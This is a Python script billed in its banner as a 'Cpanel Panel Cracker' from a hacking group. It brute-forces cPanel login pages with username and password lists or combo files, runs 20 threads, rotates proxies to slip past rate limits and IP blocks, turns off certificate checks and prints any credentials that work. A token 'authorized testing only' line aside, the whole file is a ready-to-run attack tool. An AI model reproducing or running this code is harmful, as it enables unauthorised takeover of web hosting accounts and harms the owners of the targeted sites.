import requests
from requests.auth import HTTPBasicAuth
import urllib3
import concurrent.futures
import random
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_banner():
    banner = r"""
  ___       _          ____             _       ____      _               
 / _ \  ___| |_ ___   |  _ \  __ _ _ __| | __  / ___|   _| |__   ___ _ __ 
| | | |/ __| __/ _ \  | | | |/ _` | '__| |/ / | |  | | | | '_ \ / _ \ '__|
| |_| | (__| || (_) | | |_| | (_| | |  |   <  | |__| |_| | |_) |  __/ |   
 \___/ \___|\__\___/  |____/ \__,_|_|  |_|\_\  \____\__, |_.__/ \___|_|   
                                                    |___/                 
 ____                            _ 
/ ___|  __ _ _   _  __ _ _ __ __| |
\___ \ / _` | | | |/ _` | '__/ _` |
 ___) | (_| | |_| | (_| | | | (_| |
|____/ \__, |\__,_|\__,_|_|  \__,_|
          |_|                      

    🛠️ Cpanel Panel Cracker
    👤 Made by: Ariyan Bin Bappy
    ☠️  Group: Octo Dark Cyber Squad 
    ⚠️  For authorized testing only 
"""
    print(banner)

def load_list_from_file(path):
    try:
        with open(path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Failed to read file {path}: {e}")
        sys.exit(1)

def get_random_proxy(proxies):
    if not proxies:
        return None
    proxy = random.choice(proxies)
    return {
        "http": proxy,
        "https": proxy,
    }

def try_login(domain, username, password, proxies):
    urls = [
        f"https://{domain}:2083/login/",
        f"http://{domain}:2082/login/",
    ]
    headers = {
        "User-Agent": "Mozilla/5.0 (compatible; CpanelCracker/1.0)"
    }

    proxy = get_random_proxy(proxies)

    for url in urls:
        try:
            resp = requests.get(
                url,
                auth=HTTPBasicAuth(username, password),
                headers=headers,
                timeout=8,
                verify=False,
                proxies=proxy
            )

            if resp.status_code == 200 and "incorrect" not in resp.text.lower():
                print(f"[+] SUCCESS: {username}:{password} @ {url}")
                return True
            elif resp.status_code == 401:
                return False
            elif resp.status_code in [429, 403]:
                print("[!] Possible IP blocking or rate limit detected.")
                return False
        except requests.exceptions.ProxyError:
            print("[!] Proxy error, rotating proxy.")
        except requests.RequestException as e:
            print(f"[!] Request error on {url}: {e}")
    return False

def main():
    print_banner()
    domain = input("Enter target domain or IP (no protocol, no port): ").strip()
    mode = input("Use combo file? (y/n): ").strip().lower()

    combo_mode = (mode == 'y')

    if combo_mode:
        combo_file = input("Enter path to combo file (username:password): ").strip()
        combos = load_list_from_file(combo_file)
    else:
        username_file = input("Enter path to username list file: ").strip()
        password_file = input("Enter path to password list file: ").strip()
        usernames = load_list_from_file(username_file)
        passwords = load_list_from_file(password_file)

    proxy_file = input("Enter path to proxy list file (optional, press enter to skip): ").strip()
    proxies = load_list_from_file(proxy_file) if proxy_file else []

    print(f"[*] Starting attack with proxy pool of {len(proxies)}...")

    found = False
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = []

            if combo_mode:
                for line in combos:
                    if ':' not in line:
                        continue
                    user, pwd = line.split(':', 1)
                    futures.append(executor.submit(try_login, domain, user, pwd, proxies))
            else:
                for user in usernames:
                    for pwd in passwords:
                        futures.append(executor.submit(try_login, domain, user, pwd, proxies))

            for future in concurrent.futures.as_completed(futures):
                if future.result():
                    found = True
                    executor.shutdown(wait=False, cancel_futures=True)
                    break

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Exiting...")

    if not found:
        print("[*] No valid credentials found.")

if __name__ == "__main__":
    main()
